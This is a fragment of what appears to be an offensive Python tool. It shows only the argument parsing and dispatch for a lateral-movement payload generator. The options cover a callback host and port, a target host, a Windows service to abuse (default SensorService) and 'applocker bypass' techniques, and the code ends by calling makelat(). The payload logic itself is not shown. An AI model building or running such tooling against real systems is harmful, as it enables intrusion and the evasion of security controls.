    parser.add_argument('--jit','-j',required=False,dest='justintime',help='0 or 1, just-in-time compile for -t local option')
    parser.add_argument('--bypass','-k',required=False,dest='bypass',help='run or com, applocker bypass techniques')
    parser.add_argument('--service','-s',required=False,dest='service',help='target service, e.g. SensorService') # default: [TARGETHOST]    
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    binary = args.binary
    targethost = args.targethost
    jitcompile = args.justintime
    bypass = args.bypass
    service = args.service

    jitcompile = "0" if jitcompile == None else "1"
    if binary == None: binary = "0"
    if targethost == None: targethost = "0"
    if bypass == None: bypass = "0"
    if service == None: service = "0"

    if service == "0":
        service = "SensorService"
        print('[!] default service used: %s' % service)
    else:
        print('[+] targeted service: %s' % service)

    if targethost == "0":
        print('[!] -n targethost must be provided! e.g. rdc01 ! terminating!')
        sys.exit()

    if bypass == "0":
        print('[!] warning! no applocker bypass techniques chosen!')
    else:
        if bypass not in ("run","com"):
            print('[!] -k run or com only! terminating!')
            sys.exit()

    makelat(bitness,lhost,lport,ptype,binary,targethost,jitcompile,bypass,service)